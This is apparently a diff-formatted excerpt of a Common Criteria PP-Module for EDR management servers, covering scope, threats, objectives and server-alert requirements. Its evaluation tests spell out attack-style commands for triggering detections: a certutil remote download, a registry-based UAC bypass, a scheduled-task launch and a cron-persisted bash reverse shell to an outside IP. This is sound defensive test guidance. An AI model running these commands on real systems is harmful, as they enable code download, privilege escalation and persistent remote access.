+      Primary <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> Architectures</div>
+      
+      <h3 class="indexable" data-level="3" id="TOEboundary">1.3.1 TOE Boundary</h3> The <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> boundary for the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> encompasses
+        all the software from the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> vendor that represents the server or enterprise management
+        side of the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> system<a href="#period_42" id="period_42">. </a>This will typically, but not always, be software running behind a
+        web application or dashboard, and possibly with other software services running to send and
+        receive data with a Host Agent<a href="#period_43" id="period_43">. </a>The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> may also make use of a database to store collected
+        and analyzed data<a href="#period_44" id="period_44">. </a>Any database software itself is outside the scope of the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr>, as is any
+        web server software used to serve a web application or dashboard, and the underlying
+        operating system or cloud platform<a href="#period_45" id="period_45">. </a>The figure below shows <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> (right) communicating with
+        its Host Agent (left) over an untrusted network<a href="#period_46" id="period_46">. </a><p></p> 
+	
+	The requirements for the Host Agent are not covered in this <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr>, however it is expected that an ESM 
+	system will evaluate against a <abbr class="dyn-abbr"><a href="#abbr_PP-Configuration">PP-Configuration</a></abbr> that includes both the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr>  and the <a href="#bibHAGT">[Host Agent]</a> <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr><a href="#period_47" id="period_47">. </a><div class="figure" id="figure-toe_overview"><img height="" id="toe_overview" src="images/edr_overview.png" width=""><p></p><span class="ctr" data-counter-type="ct-figure" data-myid="figure-toe_overview">Figure <span class="counter">2</span></span>:
+      <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> and Host Agent Communications</div>
+      
+      <h3 class="indexable" data-level="3" id="TOEplatform">1.3.2 TOE Platform</h3> The <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> platform, which consists of the <abbr class="dyn-abbr"><a href="#abbr_OS">OS</a></abbr> or 
+	      Cloud platform on which the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> software executes,  is outside the scope of evaluation<a href="#period_48" id="period_48">. </a>
+	      However, the security of the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> relies upon it<a href="#period_49" id="period_49">. </a><p></p> Any
+        communications with trusted remote file reputation or threat intelligence services is
+        relevant to overall <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> system security but is also outside the scope of evaluation<a href="#period_50" id="period_50">. </a>      
+    
+
+    <h2 class="indexable" data-level="2" id="usecases">1.4 Use Cases</h2> Requirements in this <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> are designed to address
+      the security problem for the following use cases<a href="#period_51" id="period_51">. </a>An <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>'s functionality may be
+      extended by addons, plugins, threat feeds, or other reputation services<a href="#period_52" id="period_52">. </a>These are out of
+      scope of this <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr><a href="#period_53" id="period_53">. </a><dl><dt> [USE CASE 1] Detection of Potential Unauthorized Activity</dt><dd>The detection of potentially unauthorized activity, software, or users is
+            enabled by the collection of host-based endpoint data to a central <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> where the data is
+            analyzed<a href="#period_54" id="period_54">. </a></dd><dt> [USE CASE 2] Remediation of Malicious Activity</dt><dd>The ability to initiate remediation commands to attempt a clean up of
+            detected malicious activity is a key use case of <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_55" id="period_55">. </a></dd><dt> [USE CASE 3] Discovery</dt><dd>The capability to effectively browse, query, and export aggregated host-based
+            endpoint data enables a SOC analyst to discover adversaries in post-compromise
+            scenarios<a href="#period_56" id="period_56">. </a></dd></dl>
+    
+  <h1 class="indexable" data-level="1" id="conf">2 Conformance Claims</h1>
+     <dl><dt class="cclaim" id=""></dt><dd> This <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> inherits exact conformance as required from
+          the specified <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr> and as defined in the <abbr class="dyn-abbr"><a href="#abbr_CC">CC</a></abbr> and
+          <abbr class="dyn-abbr"><a href="#abbr_CEM">CEM</a></abbr> addenda for Exact Conformance, Selection-Based SFRs, and Optional
+          SFRs (dated May 2017)<a href="#period_57" id="period_57">. </a><p></p> 
+          The following PPs and <abbr class="dyn-abbr"><a href="#abbr_PP">PP</a></abbr>-Modules are allowed to be specified in a <abbr class="dyn-abbr"><a href="#abbr_PP-Configuration">PP-Configuration</a></abbr> with this <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr>:
+          <ul>
+         
+            <li><abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> for Host Agents, Version 1.0<a href="#period_58" id="period_58">. </a></li>
+          </ul><p></p>
+        </dd><dt class="cclaim" id=""></dt><dd>This <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> is conformant to Parts 2 (extended) and 3
+          (extended) of Common Criteria Version 3.1, Release 5 [<abbr class="dyn-abbr"><a href="#abbr_CC">CC</a></abbr>]<a href="#period_59" id="period_59">. </a>        </dd><dt class="cclaim" id=""></dt><dd>This <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> is <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package Version 1.1
+          conformant<a href="#period_60" id="period_60">. </a></dd></dl>
+  <h1 class="indexable" data-level="1" id="spd">3 Security Problem Description</h1> The security problem is described in terms
+    of the threats that the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> is expected to address, assumptions about the
+    <abbr class="dyn-abbr"><a href="#abbr_OE">OE</a></abbr>, and any organizational security policies that the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>
+    is expected to enforce<a href="#period_61" id="period_61">. </a> These extend any threats, assumptions, and organizational security policies defined by the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr><a href="#period_62" id="period_62">. </a>    <h2 class="indexable" data-level="2" id="threats">3.1 Threats</h2>
+      <dl><dt class="threat" id="T.MISCONFIGURATION">T.MISCONFIGURATION</dt><dd>An attacker is a legitimate privileged user with access to change
+            the configuration of the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>'s security capabilities or is not a legitimate 
+            privileged user trying to access without proper authorization.<a href="#period_63" id="period_63">. </a>Attackers may
+            attempt to hide malicious activities from other privileged users<a href="#period_64" id="period_64">. </a></dd><dt class="threat" id="T.CREDENTIAL_REUSE">T.CREDENTIAL_REUSE</dt><dd>An attacker is positioned on a communications channel or elsewhere on the
+            network infrastructure<a href="#period_65" id="period_65">. </a>Attackers may guess or harvest legitimate credentials from the
+            <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>, endpoints, or insecure network activity<a href="#period_66" id="period_66">. </a></dd></dl>
+    
+    <h2 class="indexable" data-level="2" id="Assumptions">3.2 Assumptions</h2>
+These assumptions are made on the Operational Environment in order to be able to ensure that the
+security functionality specified in the <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> can be provided by the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr><a href="#period_67" id="period_67">. </a>If the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> is placed in an
+Operational Environment that does not meet these assumptions, the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> may no longer be able to
+provide all of its security functionality<a href="#period_68" id="period_68">. </a>      
+      <dl><dt class="assumption" id="A.CONNECTIVITY">A.CONNECTIVITY</dt><dd>The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> relies on network connectivity to carry out its
+          management activities<a href="#period_69" id="period_69">. </a>The <abbr class="dyn-abbr"><a href="#abbr_OE">OE</a></abbr> will provide reliable network connectivity for the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> to operate<a href="#period_70" id="period_70">. </a>            The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> will robustly handle occasional instances when
+          connectivity is unavailable or unreliable<a href="#period_71" id="period_71">. </a></dd></dl>
+    
+    <h2 class="indexable" data-level="2" id="OSPs">3.3 Organizational Security Policies</h2>
+      This <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> defines no additional organizational security policies beyond those defined in the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr><a href="#period_72" id="period_72">. </a>    
+  <h1 class="indexable" data-level="1" id="obj">4 Security Objectives</h1>
+    <h2 class="indexable" data-level="2" id="SecurityObjectivesTOE">4.1 Security Objectives for the TOE</h2>
+      <dl><dt class="SO" id="O.ACCOUNTABILITY">O.ACCOUNTABILITY</dt><dd>The <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> must provide logging facilities which record
+            management actions undertaken by identified and authenticated management users<a href="#period_73" id="period_73">. </a><p></p>
+            Addressed by: <a href="#FAU_GEN.1/EDR">FAU_GEN.1/EDR</a>, <a href="#FIA_AUT_EXT.1">FIA_AUT_EXT.1</a>
+          </dd><dt class="SO" id="O.EDR_MANAGEMENT">O.EDR_MANAGEMENT</dt><dd>The <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> must facilitate authorized management by the enterprise,
+            providing consistent and supported interfaces for their security-relevant configuration,
+            maintenance, and operation<a href="#period_74" id="period_74">. </a><p></p>
+            Addressed by: <a href="#FAU_ALT_EXT.1">FAU_ALT_EXT.1</a>, <a href="#FAU_COL_EXT.1">FAU_COL_EXT.1</a>, <a href="#FIA_AUT_EXT.1">FIA_AUT_EXT.1</a>, <a href="#FIA_PWD_EXT.1">FIA_PWD_EXT.1</a>, <a href="#FMT_SMF.1/ENDPOINT">FMT_SMF.1/ENDPOINT</a>, <a href="#FMT_SMF.1/HOST">FMT_SMF.1/HOST</a>, <a href="#FMT_SMR.1">FMT_SMR.1</a>, <a href="#FMT_SRF_EXT.1">FMT_SRF_EXT.1</a>, <a href="#FMT_TRM_EXT.1">FMT_TRM_EXT.1</a> (objective)
+          </dd><dt class="SO" id="O.PROTECTED_TRANSIT">O.PROTECTED_TRANSIT</dt><dd>To address both passive (eavesdropping) and active (packet modification)
+            network attack threats, conformant <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr>
+              s will use a trusted channel to protect all communications<a href="#period_75" id="period_75">. </a>Sensitive data
+            includes cryptographic keys, passwords, and any other data specific to the application
+            that should not be exposed outside of the application or to unauthenticated users<a href="#period_76" id="period_76">. </a><p></p>
+            Addressed by: FCS_DTLSS_EXT.1 (from <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package), FCS_DTLSC_EXT.1 (from <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package), FCS_HTTPS_EXT.1 (from <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr>), 
+            FCS_TLSC_EXT.1 (from <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package), FCS_TLSC_EXT.2 (from <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package), FCS_TLSS_EXT.1 (from <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package), 
+            FCS_TLSS_EXT.2 (from <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package), <a href="#FPT_ITT.1">FPT_ITT.1</a>, <a href="#FTP_TRP.1">FTP_TRP.1</a>
+          </dd></dl>
+    
+    <h2 class="indexable" data-level="2" id="SecurityObjectivesTOEorEnvironment">4.2 Security Objectives for the Operational Environment</h2>
+The Operational Environment of the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> implements technical and procedural measures to assist the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> in correctly providing its security functionality (which is defined by the security objectives for the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr>)<a href="#period_77" id="period_77">. </a>The security objectives for the Operational Environment consist of a set of statements describing the goals that the Operational Environment should achieve<a href="#period_78" id="period_78">. </a>This section defines the security objectives that are to be addressed by the <abbr class="dyn-abbr"><a href="#abbr_IT">IT</a></abbr> domain or by non-technical or procedural means<a href="#period_79" id="period_79">. </a>The assumptions identified in Section 3 are incorporated as security objectives for the environment<a href="#period_80" id="period_80">. </a>      The following security objectives for the Operational
+      Environment assist the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> in correctly providing its security functionality<a href="#period_81" id="period_81">. </a>These track with
+      the assumptions about the environment<a href="#period_82" id="period_82">. </a><dl><dt class="SOE" id="OE.RELIABLE_TRANSIT">OE.RELIABLE_TRANSIT</dt><dd>Wired or wireless network traffic between the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> and
+            host agents will provide reasonably reliable connectivity<a href="#period_83" id="period_83">. </a></dd></dl>
+    
+    <h2 class="indexable" data-level="2" id="secconrat">4.3 Security Objectives Rationale</h2>   
+    This section describes how the assumptions, threats, and organization security policies map to the security objectives<a href="#period_84" id="period_84">. </a>    
+    <table><tr class="header"><td>Threat, Assumption, or OSP</td><td>Security Objectives</td><td>Rationale</td></tr><tr class="major-row"><td rowspan="2"><a href="#T.MISCONFIGURATION">T.MISCONFIGURATION</a><br></td><td><a href="#O.EDR_MANAGEMENT">O.EDR_MANAGEMENT</a></td><td>The threat <a href="#T.MISCONFIGURATION">T.MISCONFIGURATION</a> is countered by <a href="#O.EDR_MANAGEMENT">O.EDR_MANAGEMENT</a> as this
+            provides for authorized management of administrative activities<a href="#period_85" id="period_85">. </a></td></tr><tr><td><a href="#O.ACCOUNTABILITY">O.ACCOUNTABILITY</a></td><td>The threat <a href="#T.MISCONFIGURATION">T.MISCONFIGURATION</a> is countered by <a href="#O.ACCOUNTABILITY">O.ACCOUNTABILITY</a> as this
+              provides for identity, authentication, and audit of administrative activities<a href="#period_86" id="period_86">. </a></td></tr><tr class="major-row"><td rowspan="2"><a href="#T.CREDENTIAL_REUSE">T.CREDENTIAL_REUSE</a><br></td><td><a href="#O.PROTECTED_TRANSIT">O.PROTECTED_TRANSIT</a></td><td>The threat <a href="#T.CREDENTIAL_REUSE">T.CREDENTIAL_REUSE</a> is countered by <a href="#O.PROTECTED_TRANSIT">O.PROTECTED_TRANSIT</a> as this
+              provides for confidentiality of transmitted data<a href="#period_87" id="period_87">. </a></td></tr><tr><td>O.PROTECTED_STORAGE</td><td>The threat <a href="#T.CREDENTIAL_REUSE">T.CREDENTIAL_REUSE</a> is countered by O.PROTECTED_STORAGE (from <a href="#bibAppPP">[AppPP]</a>) as this
+              provides for confidentiality of locally stored credentials<a href="#period_88" id="period_88">. </a></td></tr><tr class="major-row"><td rowspan="1"><a href="#A.CONNECTIVITY">A.CONNECTIVITY</a><br></td><td><a href="#OE.RELIABLE_TRANSIT">OE.RELIABLE_TRANSIT</a></td><td>The <abbr class="dyn-abbr"><a href="#abbr_OE">OE</a></abbr> objective <a href="#OE.RELIABLE_TRANSIT">OE.RELIABLE_TRANSIT</a> is realized through
+            <a href="#A.CONNECTIVITY">A.CONNECTIVITY</a><a href="#period_89" id="period_89">. </a></td></tr></table>
+  <h1 class="indexable" data-level="1" id="req">5 Security Requirements</h1>
+     This chapter describes the security requirements which have to be fulfilled by the product under evaluation<a href="#period_90" id="period_90">. </a>     Those requirements comprise functional components from Part 2 and assurance components from Part 3 of <a href="#bibCC">[CC]</a><a href="#period_91" id="period_91">. </a>     The following conventions are used for the completion of operations:
+     <ul>
+       <li>
+         <b>Refinement</b> operation (denoted by <b>bold text</b> or <strike>strikethrough
+         text</strike>): is used to add details to a requirement (including replacing an assignment
+         with a more restrictive selection) or to remove part of the requirement that is made irrelevant
+         through the completion of another operation, and thus further restricts a requirement<a href="#period_92" id="period_92">. </a>         </li>
+       <li>
+         <b>Selection</b> (denoted by <i>italicized text</i>): is used to select one or more options
+         provided by the [<abbr class="dyn-abbr"><a href="#abbr_CC">CC</a></abbr>] in stating a requirement<a href="#period_93" id="period_93">. </a></li>
+       <li>
+         <b>Assignment</b> operation (denoted by <span class="assignable-content">italicized text</span>): is used to assign a
+         specific value to an unspecified parameter, such as the length of a password<a href="#period_94" id="period_94">. </a>Showing the
+         value in square brackets indicates assignment<a href="#period_95" id="period_95">. </a></li>
+       <li>
+         <b>Iteration</b> operation: is indicated by appending the <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> name with a slash and unique identifier
+            suggesting the purpose of the operation, e.g<a href="#period_96" id="period_96">. </a>"/EXAMPLE1."
+       </li>
+     </ul>
+   <h2 class="indexable" data-level="2" id="App">5.1 App PP
+       Security Functional Requirements Direction
+    </h2>
+        In a <abbr class="dyn-abbr"><a href="#abbr_PP-Configuration">PP-Configuration</a></abbr> that includes <a href="#bibAppPP">[AppPP]</a>, the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> is expected to rely on some of the security functions implemented by the application as a whole and evaluated against the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr><a href="#period_97" id="period_97">. </a>The SFRs listed in this section are defined in the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr> and relevant to the secure operation of the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_98" id="period_98">. </a>This section describes any modifications that the <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr> author must make to the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr> SFRs to satisfy the required <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> functionality<a href="#period_99" id="period_99">. </a>      <h2 class="indexable" data-level="3" id="modsfr-App">5.1.1 
+      Modified SFRs
+    </h2>
+      This <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> does not modify any SFRs defined by the App <abbr class="dyn-abbr"><a href="#abbr_PP">PP</a></abbr><a href="#period_100" id="period_100">. </a>    <h2 class="indexable" data-level="2" id="man-sfrs">5.2 TOE Security Functional Requirements</h2>
+	The following section describes the SFRs that must be satisfied by any <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> that claims conformance to this <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr><a href="#period_101" id="period_101">. </a>	These SFRs must be claimed regardless of which <abbr class="dyn-abbr"><a href="#abbr_PP-Configuration">PP-Configuration</a></abbr> is used to define the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr><a href="#period_102" id="period_102">. </a>        <h3 class="indexable" data-level="3" id="fau">5.2.1 Security Audit (FAU)</h3>
+
+          
+
+          <div class="comp" id="FAU_ALT_EXT.1"><h4>FAU_ALT_EXT.1 Server Alerts</h4>
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            <div class="element"><div class="reqid" id="FAU_ALT_EXT.1.1"><a class="abbr" href="#FAU_ALT_EXT.1.1">FAU_ALT_EXT.1.1</a></div><div class="reqdesc">
+              The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall alert authorized users on a management dashboard
+                in the event of any of the following: <ol type="a">
+                  <li>Change in Host Agent enrollment status,</li>
+                  <li>Detection of potentially unauthorized activity on enrolled endpoints<a href="#period_103" id="period_103">. </a></li>
+                </ol>
+              
+              <div class="appnote"><span class="note-header">Application Note: </span><span class="note"> The intent of this requirement is to specify the minimum set
+                of management dashboard alert capabilities the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> must be capable
+                of displaying to an authorized user<a href="#period_104" id="period_104">. </a><p></p>
+                Examples of detection of potentially unauthorized activity on enrolled endpoints include;
+                anomalous activity, escalation of privileges, and lateral movement<a href="#period_105" id="period_105">. </a>              </span></div>
+            </div></div>
+            <div class="element"><div class="reqid" id="FAU_ALT_EXT.1.2"><a class="abbr" href="#FAU_ALT_EXT.1.2">FAU_ALT_EXT.1.2</a></div><div class="reqdesc">
+              The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall provide a visualization of detected alerts of
+                potentially unauthorized incidents, and shall include: <ol type="a">
+                  <li>An initial incident severity and [<b>selection</b>: <i>assessment</i>, <i>categorization</i>, <i>score</i>, <i>ranking</i>],</li>
+                  <li>An incident timeline<a href="#period_106" id="period_106">. </a></li>
+                </ol>
+              
+              <div class="appnote"><span class="note-header">Application Note: </span><span class="note"> The intent of this requirement is to specify the minimum set
+                of incident visualizations the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> must be capable of displaying
+                to an authorized user<a href="#period_107" id="period_107">. </a>Visualization is broadly defined as the display of incident
+                data to an authorized user on the management dashboard<a href="#period_108" id="period_108">. </a>The visualization is not
+                required to be interactive<a href="#period_109" id="period_109">. </a></span></div>
+            </div></div>
+            <div class="element"><div class="reqid" id="FAU_ALT_EXT.1.3"><a class="abbr" href="#FAU_ALT_EXT.1.3">FAU_ALT_EXT.1.3</a></div><div class="reqdesc">
+              The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall provide a data export capability for
+                  selected alerts with a specified standards-based format of 
+				  [<b>selection</b>: <ul><li><i>Structured Threat Information eXpression (<abbr class="dyn-abbr"><a href="#abbr_STIX">STIX</a></abbr>)</i>, </li><li><i>Cyber Observable eXpression (<abbr class="dyn-abbr"><a href="#abbr_CybOX">CybOX</a></abbr>)</i>, </li><li><i>Incident Object Description Exchange Format (<abbr class="dyn-abbr"><a href="#abbr_IODEF">IODEF</a></abbr>)</i>, </li><li><i>Common Event Format (<abbr class="dyn-abbr"><a href="#abbr_CEF">CEF</a></abbr>)</i>, </li><li><i>Log Event Extended Format (<abbr class="dyn-abbr"><a href="#abbr_LEEF">LEEF</a></abbr>)</i></li></ul>]
+				  <a href="#period_110" id="period_110">. </a>	
+			  
+              <div class="appnote"><span class="note-header">Application Note: </span><span class="note"> The intent of this requirement is to specify a selection of
+                standards-based formats the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> must provide for the export of selected alerts, at least one must be selected<a href="#period_111" id="period_111">. </a></span></div>
+              <div class="activity_pane hide"><div class="activity_pane_header"><a href="#" onclick="toggle(this);return false;"><span class="activity_pane_label"> Evaluation Activity </span><span class="toggler"></span></a></div><div class="activity_pane_body"><i>
+                  <div class="eacategory"><abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr></div>
+                    The evaluator shall examine the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> to ensure that it describes how alerts for changes in Host Agent
+                    enrollment status and potentially unauthorized activities on enrolled endpoints are detected and displayed<a href="#period_112" id="period_112">. </a>
+                    The evaluator shall examine the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> to ensure it contains the
+                    list of unauthorized activity types categorized or labeled by the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> upon
+                    detection<a href="#period_113" id="period_113">. </a><br><br>
+                    
+                    The evaluator shall examine the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> to ensure that it describes how alert visualizations 
+                    are displayed and what content is included<a href="#period_114" id="period_114">. </a><br><br>
+                  
+                  The evaluator shall examine the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> to ensure that it describes what formats are supported<a href="#period_115" id="period_115">. </a><p></p>
+                
+                <div class="eacategory">Guidance</div>
+                  The evaluator shall review operational guidance to ensure that it
+                  contains documentation on enrolling and unenrolling Host Agents from the
+                  <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_116" id="period_116">. </a><br><br>
+                  
+                  The evaluator shall review operational guidance to identify a
+                  list of unauthorized activity types categorized or labeled by the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> upon
+                  detection<a href="#period_117" id="period_117">. </a><br><br>
+                  
+                  The evaluator shall ensure guidance includes any needed configuration information for displaying alerts 
+                  in relation to changes in Host Agent enrollment status and potentially unauthorized activities<a href="#period_118" id="period_118">. </a><br><br>
+                  
+                  The evaluator shall review the operational guidance to ensure that it
+                  contains documentation on using the management dashboard to visualize and view
+                  alerts<a href="#period_119" id="period_119">. </a>
+                  
+                  <br><br>The evaluator shall review the operational guidance to ensure that it
+                  contains documentation on the products supported for exporting alerts in standards-based formats<a href="#period_120" id="period_120">. </a><p></p>
+                
+                <div class="eacategory">Tests</div> 
+                  The evaluator shall perform the following tests:<br><br>
+                  The evaluator shall follow guidance to unenroll a Host Agent from the
+                  <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> and verify that the unenrollment action is recorded in an auditable and
+                  timestamped activity log<a href="#period_121" id="period_121">. </a>
+                  <br>
+                  <br>
+                  The evaluator
+                  shall follow guidance to enroll a Host Agent to the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> and verify that the
+                  enrollment action is recorded in an auditable and timestamped activity log<a href="#period_122" id="period_122">. </a><br><br>
+                  <b>For Windows,</b> the evaluator shall test the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>'s ability to detect
+                  anomalous activity by performing the following subtests based on the platform of
+                  the enrolled Host Agent's system, verifying for each that, corresponding alerts
+                  were generated in the management dashboard:<br><ul>
+                    <li><b>Test 1: </b>The evaluator shall open a Windows command prompt as a user and run the
+                      command <code>cmd /c certutil -urlcache -split -f &lt;remote file&gt;
+                        &lt;download directory&gt;</code>, where the remote file is a valid file path
+                      to an accessible, remotely stored executable, and the download directory is a
+                      valid directory path writable by the current local user<a href="#period_123" id="period_123">. </a></li>
+                    <li><b>Test 2: </b>The evaluator shall open a Windows command prompt as a user and run the
+                      command <code>reg.exe add hkcu\software\classes\mscfile\shell\open\command
+                        /ve /d "&lt;local executable&gt;" /f</code>, where the local executable is a
+                      valid file path to a readable, local executable<a href="#period_124" id="period_124">. </a>The evaluator will then run
+                      the command <code>cmd.exe /c eventvwr.msc</code> in the same command
+                      prompt window<a href="#period_125" id="period_125">. </a></li>
+                    <li><b>Test 3: </b>The evaluator shall open a Windows command prompt as a user and run the
+                      command <code>SCHTASKS /Create /SC ONCE /TN spawn /TR &lt;local
+                        executable&gt;" /<abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr> &lt;time&gt;</code>, where the local executable is a
+                      valid file path to a readable, local executable, and time is a start time that
+                      occurs within minutes of the task being created<a href="#period_126" id="period_126">. </a></li>
+                  </ul>
+                  <b>For Linux,</b> the evaluator shall test the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>'s ability to detect
+                  anomalous activity by performing the following subtests based on the platform of
+                  the enrolled Host Agent's system, verifying for each that, corresponding alerts
+                  were generated in the management dashboard:<br>
+                  <ul>
+                    <li><b>Test 1: </b>The evaluator shall open a terminal and run the command <code>scp
+                      &lt;remote user&gt;@&lt;remote host&gt;:&lt;remote path&gt;
+                      &lt;download directory&gt;</code>, where the remote user is a valid user on
+                      remote host, remote path is a valid path to a remotely stored executable, and the 
+                      download directory is a valid directory path writable by the current local
+                      user<a href="#period_127" id="period_127">. </a>The remote user's password shall be provided when prompted<a href="#period_128" id="period_128">. </a></li>
+                    
+                    <li><b>Test 2: </b>The evaluator shall open a terminal and run the command <code>echo
+                      "bash -i &gt;&amp; /dev/tcp/&lt;outside <abbr class="dyn-abbr"><a href="#abbr_IP">IP</a></abbr>&gt;/5050 0&gt;&amp;1 1 &amp;" &gt; 
+                      /etc/cron.hourly/persist</code>, where the outside <abbr class="dyn-abbr"><a href="#abbr_IP">IP</a></abbr> is a valid
+                      external address<a href="#period_129" id="period_129">. </a></li>
+                  </ul>
+                  <b>For all platforms:</b>
+                  <ul>
+                    <li><b>Test 1: </b>The evaluator shall review an alert on the management dashboard and verify that
+                      the alert contains a severity field and the fields specified in the <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr><a href="#period_130" id="period_130">. </a>                      The evaluator will open or view the alert and verify that a timeline of
+                      events is available for review<a href="#period_131" id="period_131">. </a>The timeline shall show a progression of events
+                      over time<a href="#period_132" id="period_132">. </a></li>
+                    <li><b>Test 2: </b>The evaluator shall pick an alert on the management dashboard and export the
+                      alert in every format specified in the <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr><a href="#period_133" id="period_133">. </a>The evaluator shall review the operational
+                      guidance and the selection from the requirement and verify that export options
+                      exist for all the declared formats in the selection<a href="#period_134" id="period_134">. </a>After exporting one alert for
+                      each possible format the evaluator shall review the file contents of the exported
+                      alert and verify it is the correct format for the selected export option (for
+                      example, an export of the <abbr class="dyn-abbr"><a href="#abbr_IODEF">IODEF</a></abbr> type must contain '<abbr class="dyn-abbr"><a href="#abbr_IODEF">IODEF</a></abbr>-Document' in the first
+                      element of the exported file)<a href="#period_135" id="period_135">. </a></li>
+                </ul>
+              </i></div></div>
+            </div></div>
+          </div>
+
+          
+          
+          
+
+          <div class="comp" id="FAU_COL_EXT.1"><h4>FAU_COL_EXT.1 Collected Endpoint Data</h4>
+            
+
+            
+            
+            
+            
+
